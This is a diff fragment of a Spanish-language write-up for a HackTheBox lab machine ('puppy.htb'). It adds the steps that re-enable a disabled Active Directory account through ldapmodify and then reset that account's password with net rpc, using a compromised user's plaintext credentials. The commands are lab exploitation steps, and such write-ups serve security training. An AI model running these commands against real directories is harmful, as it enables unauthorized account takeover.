@@ -187,6 +187,18 @@ Para habilitarlo usaremos:
 `ldapmodify -x -H ldap://$IP -D 'ant.edwards@puppy.htb' -W  << EOF`
 Cargando las siguientes instrucciones:
 `dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB`
+`changetype: modify`
+`replace: userAccountControl`
+`userAccountControl: 66048`
+`EOF`
+
+Y en la password ponemos la de `ANT`
+Nos indicara que ha sido modificado
+
+Le volvemos a asignar la nueva contraseña:
+`net rpc password "adam.silver" "newP@ssword2022" -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S $IP`
+
+
 
 
 
